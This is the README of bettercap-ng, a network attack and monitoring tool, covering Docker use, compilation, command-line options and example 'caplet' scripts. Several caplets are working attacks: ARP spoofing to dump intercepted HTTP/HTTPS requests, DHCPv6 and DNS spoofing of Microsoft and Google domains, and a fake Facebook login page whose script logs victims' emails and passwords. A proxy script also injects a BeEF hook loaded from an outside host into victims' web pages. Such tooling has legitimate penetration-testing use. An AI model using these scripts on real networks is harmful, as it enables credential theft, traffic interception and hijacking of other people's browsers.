<p align="center">
  <img alt="BetterCap" src="https://raw.githubusercontent.com/evilsocket/bettercap-ng/master/media/logo.png" height="140" />
  <p align="center">
    <a href="https://github.com/evilsocket/bettercap-ng/releases/latest"><img alt="Release" src="https://img.shields.io/github/release/evilsocket/bettercap-ng.svg?style=flat-square"></a>
    <a href="/LICENSE"><img alt="Software License" src="https://img.shields.io/badge/license-GPL3-brightgreen.svg?style=flat-square"></a>
    <a href="https://travis-ci.org/evilsocket/bettercap-ng"><img alt="Travis" src="https://img.shields.io/travis/evilsocket/bettercap-ng/master.svg?style=flat-square"></a>
    <a href="https://goreportcard.com/report/github.com/evilsocket/bettercap-ng"><img alt="Go Report Card" src="https://goreportcard.com/badge/github.com/evilsocket/bettercap-ng?style=flat-square&fuckgithubcache=1"></a>
  </p>
</p>

**bettercap-ng** is a complete reimplementation of bettercap, the Swiss army knife for network attacks and monitoring. It is faster, stabler, smaller, easier to install and to use.

## Using it with Docker

In this repository, BetterCAP is containerized using [Alpine Linux](https://alpinelinux.org/ "") -  a security-oriented, lightweight Linux distribution based on musl libc and busybox. The resulting Docker image is relatively small and easy to manage the dependencies.

To pull latest BetterCAP version of the image:

    $ docker pull evilsocket/bettercap-ng

To run:

    $ docker run -it --privileged --net=host evilsocket/bettercap-ng -h

## Compilation

Make sure you have a correctly configured **Go >= 1.8** environment, that `$GOPATH/bin` is in `$PATH` and the `libpcap-dev` package installed for your system, then:

    $ go get github.com/evilsocket/bettercap-ng

To show the command line options:

    $ sudo bettercap-ng -h
    
    Usage of ./bettercap-ng:
      -caplet string
            Read commands from this file and execute them in the interactive session.
      -debug
            Print debug messages.
      -eval string
            Run a command, used to set variables via command line.
      -iface string
            Network interface to bind to.
      -no-history
            Disable history file.
      -silent
            Suppress all logs which are not errors.

## Compilation on Windows

Despite Windows support [is not yet 100% complete](https://github.com/evilsocket/bettercap-ng/issues/45), it is possible to build bettercap-ng for Microsoft platforms and enjoy 99.99% of the experience. The steps to prepare the building environment are:

1. Install [go amd64](https://golang.org/dl/) (add go binaries to your `%PATH%`).
2. Install [TDM GCC for amd64](http://tdm-gcc.tdragon.net/download) (add TDM-GCC binaries to your `%PATH%`).
3. Also add `TDM-GCC\x86_64-w64-mingw32\bin` to your `%PATH%`.
4. Install [winpcap](https://www.winpcap.org/install/default.htm).
5. Download [Winpcap developer's pack](https://www.winpcap.org/devel.htm) and extract it to `C:\`.
6. Find `wpcap.dll` and `packet.dll` in your PC (typically in `c:\windows\system32`).
7. Copy them to some other temp folder or else you'll have to supply Admin privs to the following commands.
8. Run `gendef` on those files: `gendef wpcap.dll` and `gendef packet.dll` (obtainable with `MinGW Installation Manager`, package `mingw32-gendef`).
9. This will generate .def files.
10. Now we'll generate the static libraries files:
11. Run `dlltool --as-flags=--64 -m i386:x86-64 -k --output-lib libwpcap.a --input-def wpcap.def`.
12. and `dlltool --as-flags=--64 -m i386:x86-64 -k --output-lib libpacket.a --input-def packet.def`.
13. Now just copy both `libwpcap.a` and `libpacket.a` to `c:\WpdPack\Lib\x64`.
14. `go get github.com/evilsocket/bettercap-ng`.
15. Enjoy.

## Cross Compilation

As an example, let's cross compile bettercap for ARM (requires `gcc-arm-linux-gnueabi`, `yacc` and `flex` packages).

**Step 1**: download and cross compile libpcap-1.8.1 for ARM (adjust `PCAPV` to use a different libpcap version):

    cd /tmp
    export PCAPV=1.8.1
    wget http://www.tcpdump.org/release/libpcap-$PCAPV.tar.gz
    tar xvf libpcap-$PCAPV.tar.gz
    cd libpcap-$PCAPV
    export CC=arm-linux-gnueabi-gcc
    ./configure --host=arm-linux --with-pcap=linux
    make

**Step 2**: now cross compile bettercap-ng itself:

    cd $GOPATH/src/github.com/evilsocket/bettercap-ng
    env CC=arm-linux-gnueabi-gcc CGO_ENABLED=1 GOOS=linux GOARCH=arm CGO_LDFLAGS="-L/tmp/libpcap-$PCAPV" make

**Done**

## Command Line Options

By issuing `bettercap-ng -h` the main command line options will be shown:

    Usage of ./bettercap-ng:
      -caplet string
            Read commands from this file and execute them in the interactive session.
      -cpu-profile file
            Write cpu profile file.
      -debug
            Print debug messages.
      -eval string
            Run one or more commands separated by ; in the interactive session, used to set variables via command line.
      -iface string
            Network interface to bind to, if empty the default interface will be auto selected.
      -mem-profile file
            Write memory profile to file.
      -no-history
            Disable interactive session history file.
      -silent
            Suppress all logs which are not errors.

If no `-caplet` option is specified, bettercap-ng will start in interactive mode.

## Interactive Mode

By default, bettercap-ng will start in interactive mode, allowing you to start and stop modules manually, change options and apply new firewall rules on the fly, to show the help menu type `help`:

    MAIN COMMANDS
    
                  help MODULE : List available commands or show module specific help if no module name is provided.
                       active : Show information about active modules.
                         quit : Close the session and exit.
                sleep SECONDS : Sleep for the given amount of seconds.
                     get NAME : Get the value of variable NAME, use * for all.
               set NAME VALUE : Set the VALUE of variable NAME.
                        clear : Clear the screen.
               include CAPLET : Load and run this caplet in the current session.
                    ! COMMAND : Execute a shell command and print its output.
               alias MAC NAME : Assign an alias to a given endpoint given its MAC address.

    MODULES
                     api.rest > not running
                    arp.spoof > not running
                  dhcp6.spoof > not running
                    dns.spoof > not running
                events.stream > running
                   http.proxy > not running
                  http.server > not running
                  https.proxy > not running
                  mac.changer > not running
                    net.probe > not running
                    net.recon > running
                    net.sniff > not running
                       ticker > not running
                          wol > not running

You can have module specific help by using `help module-name` (for instance try with `help net.recon`), to print all variables you can use `get *`.

## Caplets

Interactive sessions can be scripted with `.cap` files, or `caplets`, the following are a few basic examples, look the `caplets` folder for more.

#### caplets/http-req-dump.cap

Execute an ARP spoofing attack on the whole network (by default) or on a host (using `-eval` as described), intercept HTTP and HTTPS requests with the `http.proxy` and `https.proxy` modules and dump them using the `http-req-dump.js` proxy script.

```sh
# targeting the whole subnet by default, to make it selective:
#
#   sudo ./bettercap-ng -caplet caplets/http-req-dump.cap -eval "set arp.spoof.targets 192.168.1.64"

# to make it less verbose
# events.stream off

# discover a few hosts 
net.probe on
sleep 1
net.probe off

# uncomment to enable sniffing too
# set net.sniff.verbose false
# set net.sniff.local true
# set net.sniff.filter tcp port 443
# net.sniff on

# we'll use this proxy script to dump requests
set https.proxy.script caplets/http-req-dump.js
set http.proxy.script caplets/http-req-dump.js
clear

# go ^_^
http.proxy on
https.proxy on
arp.spoof on
```

#### caplets/netmon.cap

An example of how to use the `ticker` module, use this caplet to monitor activities on your network.

```sh
net.probe on
clear
ticker on
```

#### caplets/mitm6.cap

[Reroute IPv4 DNS requests by using DHCPv6 replies](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/), start a HTTP server and DNS spoofer for `microsoft.com` and `google.com`.

```sh
# let's spoof Microsoft and Google ^_^
set dns.spoof.domains microsoft.com, google.com
set dhcp6.spoof.domains microsoft.com, google.com

# every request http request to the spoofed hosts will come to us
# let's give em some contents
set http.server.path caplets/www

# serve files
http.server on
# redirect DNS request by spoofing DHCPv6 packets
dhcp6.spoof on
# send spoofed DNS replies ^_^
dns.spoof on

# set a custom prompt for ipv6
set $ {by}{fw}{cidr} {fb}> {env.iface.ipv6} {reset} {bold}» {reset}
# clear the events buffer and the screen
events.clear
clear
```

<center>
    <img src="https://pbs.twimg.com/media/DTXrMJJXcAE-NcQ.jpg:large" width="100%"/>
</center>

#### caplets/rest-api.cap

Start a rest API.

```sh
# change these!
set api.rest.username bcap
set api.rest.password bcap
# set api.rest.port 8082

# actively probe network for new hosts
net.probe on

# enjoy /api/session and /api/events
api.rest on
```

Get information about the current session:

    curl -k --user bcap:bcap https://bettercap-ip:8083/api/session

Execute a command in the current interactive session:

    curl -k --user bcap:bcap https://bettercap-ip:8083/api/session -H "Content-Type: application/json" -X POST -d '{"cmd":"net.probe on"}'

Get last 50 events:

    curl -k --user bcap:bcap https://bettercap-ip:8083/api/events?n=50

Clear events:

    curl -k --user bcap:bcap -X DELETE https://bettercap-ip:8083/api/events

<center>
    <img src="https://pbs.twimg.com/media/DTAreSCX4AAXX6v.jpg:large" width="100%"/>
</center>

#### caplets/fb-phish.cap

This caplet will create a fake Facebook login page on port 80, intercept login attempts using the `http.proxy`, print credentials and redirect the target to the real Facebook.

<center>
    <img src="https://pbs.twimg.com/media/DTY39bnXcAAg5jX.jpg:large" width="100%"/>
</center>

Make sure to create the folder first:

    $ cd caplets/www/
    $ make

```sh
set http.server.address 0.0.0.0
set http.server.path caplets/www/www.facebook.com/

set http.proxy.script caplets/fb-phish.js

http.proxy on
http.server on
```

The `caplets/fb-phish.js` proxy script file:

```javascript
function onRequest(req, res) {
    if( req.Method == "POST" && req.Path == "/login.php" && req.ContentType == "application/x-www-form-urlencoded" ) {
        var form = req.ParseForm();
        var email = form["email"] || "?", 
            pass  = form["pass"] || "?";

        log( R(req.Client), " > FACEBOOK > email:", B(email), " pass:'" + B(pass) + "'" );

        res.Status      = 301;
        res.Headers     = "Location: https://www.facebook.com/\n" +
                          "Connection: close";
    }
}
```

#### caplets/beef-inject.cap

Use a proxy script to inject a BEEF javascript hook:

```sh
# targeting the whole subnet by default, to make it selective:
#
#   sudo ./bettercap-ng -caplet caplets/beef-active.cap -eval "set arp.spoof.targets 192.168.1.64"

# inject beef hook
set http.proxy.script caplets/beef-inject.js
# redirect http traffic to a proxy
http.proxy on
# wait for everything to start properly
sleep 1
# make sure probing is off as it conflicts with arp spoofing
arp.spoof on
```

The `caplets/beef.inject.js` proxy script file:

```javascript
function onLoad() {
    console.log( "BeefInject loaded." );
    console.log("targets: " + env['arp.spoof.targets']);
}

function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                '</head>', 
                '<script type="text/javascript" src="http://your-beef-box:3000/hook.js"></script></head>' 
            ); 
        }
    }
}
```

## License

`bettercap` and `bettercap-ng` are made with ♥  by [Simone Margaritelli](https://www.evilsocket.net/) and they're released under the GPL 3 license.
